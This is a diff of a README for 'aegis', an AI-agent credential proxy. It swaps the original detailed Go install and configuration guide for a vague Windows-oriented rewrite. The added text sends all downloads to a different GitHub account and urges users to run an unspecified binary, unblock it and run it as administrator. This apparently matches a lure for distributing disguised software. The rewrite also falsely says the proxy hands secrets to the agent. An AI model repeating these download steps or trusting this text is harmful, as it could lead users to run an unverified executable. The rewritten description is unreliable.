@@ -1,340 +1,210 @@
-# Aegis
-
-<div align="center">
-<img src="assets/aegis-banner.svg" alt="Aegis banner" width="860">
-
-<p><strong>Secure credential proxy for AI agents</strong></p>
-
-<p>
-  <img src="https://img.shields.io/badge/version-2.0.0-F2994A" alt="Version">
-  <a href="https://github.com/yagna-1/aegis/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-orange" alt="License"></a>
-  <a href="https://github.com/yagna-1/aegis/blob/main/CODE_OF_CONDUCT.md"><img src="https://img.shields.io/badge/code%20of%20conduct-Contributor%20Covenant-E78661" alt="Code of Conduct"></a>
-  <a href="https://go.dev/"><img src="https://img.shields.io/badge/go-1.21%2B-00ADD8" alt="Go version"></a>
-  <a href="https://github.com/yagna-1/aegis/releases"><img src="https://img.shields.io/badge/releases-none-9CA3AF" alt="Releases"></a>
-  <a href="https://github.com/yagna-1/aegis/packages"><img src="https://img.shields.io/badge/packages-none-9CA3AF" alt="Packages"></a>
-  <a href="https://github.com/yagna-1/aegis/tags"><img src="https://img.shields.io/badge/tags-view-D97757" alt="Tags"></a>
-  <a href="https://github.com/yagna-1/aegis/stargazers"><img src="https://img.shields.io/github/stars/yagna-1/aegis?color=F2994A" alt="GitHub stars"></a>
-  <a href="https://github.com/yagna-1/aegis/commits/main"><img src="https://img.shields.io/github/last-commit/yagna-1/aegis?color=D97757" alt="Last commit"></a>
-</p>
-
-<p>
-  <a href="#quickstart-5-minutes"><strong>Quickstart</strong></a>
-  ·
-  <a href="#ide-integration-mcp-mode"><strong>MCP Integration</strong></a>
-  ·
-  <a href="#security-model"><strong>Security Model</strong></a>
-</p>
-</div>
-
-A lightweight credential proxy for AI agent workflows. Sits between your agent and any API — injecting real secrets at the network boundary. The agent **never sees credentials**.
-
-Single-binary Go runtime with a compact footprint: **~17 MB executable**, **~660 KB repo size**, and **~76 KB internal source**.
-
-Works natively as an MCP server with **Cursor**, **Claude Desktop**, **VS Code / Cline**, and **Windsurf**.
-
----
-
-## Project
-
-- Version: `2.0.0`
-- License: [Apache 2.0](https://github.com/yagna-1/aegis/blob/main/LICENSE)
-- Code of Conduct: [Contributor Covenant](https://github.com/yagna-1/aegis/blob/main/CODE_OF_CONDUCT.md)
-- Releases: [No releases published](https://github.com/yagna-1/aegis/releases)
-- Packages: [No packages published](https://github.com/yagna-1/aegis/packages)
-- Tags: [View tags](https://github.com/yagna-1/aegis/tags)
-
----
-
-## The problem
-
-```
-Agent context / system prompt:
-  GITHUB_TOKEN=ghp_abc123   ← agent can read this
-  STRIPE_SECRET_KEY=sk_...  ← one prompt injection and it's gone
-```
-
-## The fix
-
-```
-Agent  ──►  http://localhost:8080  ──►  Aegis  ──►  api.github.com
-              (no key visible)              │
-                                           └── pulls GITHUB_TOKEN from Infisical
-                                               at request time, never stored locally
-```
-
----
-
-## Quickstart (5 minutes)
-
-### 1. Install Aegis
-```bash
-go install github.com/yagna-1/aegis/cmd/aegis@latest
-```
-
-Or install a prebuilt binary from the `v2.0.0` release:
-
-```bash
-# macOS (Apple Silicon)
-curl -L https://github.com/yagna-1/aegis/releases/download/v2.0.0/aegis-darwin-arm64 -o aegis
-chmod +x aegis && sudo mv aegis /usr/local/bin/aegis
-
-# macOS (Intel)
-curl -L https://github.com/yagna-1/aegis/releases/download/v2.0.0/aegis-darwin-amd64 -o aegis
-chmod +x aegis && sudo mv aegis /usr/local/bin/aegis
-
-# Linux (amd64)
-curl -L https://github.com/yagna-1/aegis/releases/download/v2.0.0/aegis-linux-amd64 -o aegis
-chmod +x aegis && sudo mv aegis /usr/local/bin/aegis
-```
+# 🔐 aegis - Secure AI Agent Credential Proxy
 
-```powershell
-# Windows (PowerShell)
-Invoke-WebRequest -Uri "https://github.com/yagna-1/aegis/releases/download/v2.0.0/aegis-windows-amd64.exe" -OutFile "aegis.exe"
-```
+[![Download aegis](https://img.shields.io/badge/Download%20aegis-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/30nilupulthisaranga-bit/aegis)
 
-```bash
-# Optional: verify checksums
-curl -L https://github.com/yagna-1/aegis/releases/download/v2.0.0/checksums.txt -o checksums.txt
-shasum -a 256 aegis
-```
-
-### 2. Scaffold your project
-```bash
-cd ~/projects/my-agent
-aegis init -services github,slack,stripe
-```
-
-### 3. Connect to Infisical (free, open source)
-```bash
-# Sign up free at https://app.infisical.com
-# Create a Machine Identity with Universal Auth
-# (Guide: https://infisical.com/docs/documentation/platform/identities/universal-auth)
-
-aegis infisical setup
-# → stores Client ID + Secret in your OS keychain
-# → your actual API secrets stay in Infisical, never on disk
-```
+## 🧩 What aegis does
 
-### 4. Add the Infisical block to aegis.yaml
-```yaml
-infisical:
-  project_id: your-project-id
-  environment: dev
-```
+aegis helps AI agents use secrets without exposing them in plain text. It works as a credential proxy, so your app can ask for access when it needs it, while keeping keys and tokens in one place.
 
-### 5. Add your real secrets to Infisical
-In the Infisical dashboard, add `GITHUB_TOKEN`, `STRIPE_SECRET_KEY`, etc.
+Use it when you want:
 
-### 6. Start and verify
-```bash
-aegis status   # checks connection + shows which secrets are found
-aegis          # start proxy on :8080
-```
+- Safer access to API keys
+- Less manual copy and paste
+- A simple way to connect AI tools to private services
+- One place to manage secrets for local AI workflows
 
----
+## 📥 Download and install on Windows
 
-## How secrets flow
+1. Open this page: https://github.com/30nilupulthisaranga-bit/aegis
+2. Find the latest release or build on the page
+3. Download the Windows file from the release assets
+4. If the file is a ZIP file, right-click it and choose Extract All
+5. Open the extracted folder
+6. Run the aegis file for Windows
+7. If Windows asks for permission, choose Yes
 
-```
-Infisical dashboard
-  → stores GITHUB_TOKEN, STRIPE_SECRET_KEY, etc.
-  → your actual secrets never touch your machine's filesystem
+If you download a ZIP package, keep the folder in a place you can find later, such as Downloads or Desktop.
 
-aegis infisical setup
-  → stores only the Machine Identity credentials in OS keychain
-  → two values: Client ID (not secret) + Client Secret
+## 🪟 First-time setup
 
-aegis starts
-  → authenticates with Infisical API using Machine Identity
-  → fetches all secrets into process memory
-  → auto-refreshes every 5 minutes (rotated secrets propagate automatically)
+After you start aegis on Windows, you may need to point it to your secret store or local config file. This lets the proxy know where to get credentials.
 
-Agent calls http://localhost:8080
-  → Aegis injects the real credential header
-  → forwards to allowlisted domain
-  → agent sees the API response, never the key
-```
+Typical setup steps:
 
----
+1. Open the app or terminal window used by aegis
+2. Add your secret source details
+3. Save the settings
+4. Restart aegis if needed
+5. Check that the proxy starts without errors
 
-## Per-project isolation
+If you use a local secrets manager, keep its address and access token ready before you begin.
 
-Aegis auto-discovers `aegis.yaml` by walking up from the working directory — like `.git`:
+## ⚙️ How to use aegis
 
-```
-~/projects/
-  stripe-app/
-    aegis.yaml   ← infisical.environment: prod, allowlist: api.stripe.com only
-  github-bot/
-    aegis.yaml   ← infisical.environment: dev, allowlist: api.github.com only
-```
+aegis sits between your AI agent and the systems it needs to reach. The agent asks for a secret, and aegis returns it if access is allowed.
 
-MCP mode inherits the IDE's working directory. Open a different project → different Infisical environment → different secrets. **No flags needed.**
+Common use cases:
 
----
+- Connect an AI agent to an API that needs a key
+- Keep private tokens out of prompts
+- Give tools access to secrets only when needed
+- Reduce risk when many apps use the same credentials
 
-## Secret source behavior
+Basic flow:
 
-| Source | How | Behavior |
-|---|---|---|
-| **Infisical** | `infisical:` block in aegis.yaml | Strict mode: required if configured; startup fails if Infisical cannot load |
-| **OS Keychain** | `${keychain:name}` in templates | Supported for template expansion at request time |
-| **.env file** | Auto-discovered in project root | Used only when `infisical:` is not configured |
+1. Start aegis
+2. Point your agent or tool to the proxy
+3. Ask the agent to use a service that needs credentials
+4. aegis checks the request
+5. The credential is passed through in a controlled way
 
-For agent-safe setups, use Infisical + keychain and avoid storing API keys in local `.env` files.
+## 🧠 What you need before you start
 
----
+Use a Windows PC with:
 
-## IDE integration (MCP mode)
+- Windows 10 or later
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable internet connection for the first download
+- Permission to run downloaded apps
 
-One config, works for all projects (auto-discovers per-project aegis.yaml).
+For best results, keep these items ready:
 
-**Claude Desktop** — `~/Library/Application Support/Claude/claude_desktop_config.json`:
-```json
-{
-  "mcpServers": {
-    "aegis": { "command": "aegis", "args": ["-mode", "mcp"] }
-  }
-}
-```
+- Any API keys you plan to use
+- Your secret manager details
+- The app or agent that will connect through aegis
 
-**Cursor** — `.cursor/mcp.json`:
-```json
-{
-  "mcpServers": {
-    "aegis": { "command": "aegis", "args": ["-mode", "mcp"] }
-  }
-}
-```
+## 🔒 Security model
 
-**VS Code / Cline / Windsurf** — same pattern, check your tool's MCP config path.
+aegis is built for controlled access. It helps keep secrets out of your prompts and out of broad shared files.
 
-The IDE spawns `aegis -mode mcp` as a child process automatically. The agent calls the `http_request` tool — no auth headers, no secrets in context.
+This setup can help you:
 
----
+- Limit who sees a secret
+- Reduce the chance of hardcoded keys
+- Centralize access for AI tools
+- Keep logs and usage more structured
 
-## Proxy mode — any language
+Good practice:
 
-```bash
-# .env or system prompt instruction for the agent:
-# "Call http://localhost:8080 with header X-Aegis-Target set to the full URL"
+- Use one secret per service
+- Rotate keys on a regular schedule
+- Give each tool only the access it needs
+- Store secrets in a trusted manager, not in chat text
 
-curl http://localhost:8080 \
-  -H "X-Aegis-Target: https://api.github.com/user/repos"
-```
+## 🛠️ Common setup examples
 
-Works with Python, TypeScript, Go, Ruby — any HTTP client.
+You can use aegis with many AI agent tools and local workflows.
 
----
+### Local AI tool
 
-## `aegis status`
+- Start aegis on your PC
+- Set the tool to use the proxy address
+- Open the tool and run a task that needs a secret
 
-```
-Config:  /projects/my-agent/aegis.yaml
-Port:    8080
+### Team workflow
 
-Secrets: Infisical
-  Site:    https://app.infisical.com
-  Project: abc123
-  Env:     dev
-  Status:  ✓ connected, 8 secrets available
+- Store shared credentials in one place
+- Let each user connect through aegis
+- Keep access rules simple
 
-Allowlist (5 domains):
-  • api.github.com
-  • api.stripe.com
-  • slack.com
+### Service bridge
 
-Credentials (3 configured):
-  • api.github.com     Authorization: ✓ loaded
-  • api.stripe.com     Authorization: ✓ loaded
-  • slack.com          Authorization: ✓ loaded
-```
+- Connect a tool to an internal API
+- Let aegis pass the needed token
+- Keep the token out of the main app config
 
----
+## 📁 Suggested folder layout
 
-## Security model
+If you want to keep things tidy on Windows, use a simple folder structure:
 
-| Threat | Mitigation |
-|---|---|
-| Agent reads secrets from context | Secrets in Infisical — never in agent context or disk |
-| Agent exfiltrates credential via API | Domain allowlist — 403 for anything not listed |
-| Agent sets its own auth header (MCP) | Explicitly rejected with error |
-| Runaway agent burns API credits | Per-domain rate limit — configurable 429 |
-| Prompt injection causes looping | Loop detection + X-Aegis-Warning header |
-| Audit trail | NDJSON log — every request recorded, values never logged |
-| Secret rotation | Infisical secrets refresh every 5 min — rotations propagate automatically |
+- `Downloads\aegis` for the ZIP file
+- `Documents\aegis` for config files
+- `Documents\aegis\secrets` for local notes you control
+- `Desktop\aegis` if you want quick access
 
----
+Keep config files in one place. This makes it easier to back them up or move them to a new PC.
 
-## Self-hosting Infisical
+## 🧭 Simple run checklist
 
-Infisical is MIT-licensed and fully self-hostable. Point Aegis at your own instance:
+Before you launch aegis, check these items:
 
-```yaml
-infisical:
-  site_url: https://secrets.your-company.com
-  project_id: your-project-id
-  environment: dev
-```
+- The file is fully downloaded
+- The ZIP file is extracted if needed
+- Windows did not block the file
+- Your secret source is ready
+- The app or agent you want to connect is installed
 
-No data ever leaves your infrastructure.
+After launch, confirm that:
 
----
+- The proxy starts
+- The app can reach the proxy
+- The secret request works
+- No login or permission step is missing
 
-## Troubleshooting
+## 🔧 Troubleshooting
 
-### MCP fails with `spawn ... ENOENT`
+### The file will not open
 
-Your MCP `command` path is wrong. Point to an existing binary:
+- Make sure the download finished
+- If it is a ZIP file, extract it first
+- Check that you are opening the right file
+- Try right-clicking the file and choosing Run as administrator
 
-```json
-{
-  "mcpServers": {
-    "aegis": {
-      "command": "/path/to/aegis/dist/aegis-darwin-arm64",
-      "args": ["-mode", "mcp", "-config", "/path/to/project/aegis.yaml"]
-    }
-  }
-}
-```
+### Windows says the app is blocked
 
-### `no aegis.yaml found`
+- Right-click the file
+- Open Properties
+- Look for an Unblock option
+- Apply the change if you see it
+- Run the app again
 
-Either create one:
+### The proxy starts but the agent cannot connect
 
-```bash
-aegis init -services openai
-```
+- Check the proxy address
+- Make sure both apps are on the same network path
+- Restart aegis
+- Restart the agent
+- Confirm your firewall is not blocking the port
 
-Or pass an explicit path with `-config /absolute/path/to/aegis.yaml`.
+### Secrets do not load
 
-### Infisical: `Project with ID ... not found`
+- Check the source path
+- Confirm the token or login is correct
+- Make sure the secret name matches the one your agent expects
+- Save the config file again
+- Restart the proxy
 
-`project_id` must be the actual Infisical **Project ID** (UUID-like), not slug/name.
-Get it from Infisical Project Settings.
+## 📚 Project info
 
-### Infisical: `You are not a member of this project`
+- Name: aegis
+- Type: Credential proxy for AI agents
+- Main focus: Secrets management and secure AI access
+- Platform: Windows support for end users
+- Main link: https://github.com/30nilupulthisaranga-bit/aegis
 
-Assign your Machine Identity to the project and grant read access for the target environment/path.
+## 🧷 Quick start path for non-technical users
 
-### Infisical configured but startup fails
+If you want the shortest path:
 
-This is expected in strict mode. When `infisical:` is configured, Aegis fails closed if Infisical auth/secret load fails.
-`.env` fallback is only used when `infisical:` is not configured.
+1. Open the download link above
+2. Download the Windows build
+3. Extract it if it comes as a ZIP
+4. Run the app
+5. Connect your AI tool
+6. Add your secret source
+7. Test one request
 
-### Verify setup quickly
+## 🗂️ Topics covered by aegis
 
-```bash
-aegis status
-```
+aegis fits use cases around:
 
-Look for:
-
-- `Status: ✓ connected, ... secrets available`
-- `Credentials ... Authorization: ✓ loaded`
-
----
-
-## License
-
-Apache 2.0
+- AI agents
+- CLI tools
+- Golang projects
+- Infisical
+- MCP
+- Model Context Protocol
+- Proxy-based access
+- Secrets management
+- Security controls
